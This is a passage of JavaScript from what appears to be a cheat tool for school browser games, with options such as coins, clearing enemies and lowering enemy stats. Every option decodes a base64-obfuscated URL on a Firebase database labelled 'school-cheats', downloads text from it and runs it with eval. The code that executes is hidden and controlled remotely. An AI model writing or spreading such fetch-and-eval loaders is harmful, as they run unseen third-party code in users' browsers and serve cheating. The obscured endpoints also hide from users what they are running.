      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90ZENoYW5nZUdhbWVSb3VuZC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (TDprompt == "clearenem")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90ZENsZWFyRW5lbWllcy5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (TDprompt == "coins")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90ZEdldENhc2guanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));

  }

  if (text == "doom") {
    towerprompt = prompt("Which one?", "coins, lowerstats")
    if (towerprompt == "coins")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90b2RBZGRDb2lucy5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (towerprompt == "lowerstats")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90b2RMb3dlckFsbEVuZW15U3RhdHMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));

  }
}
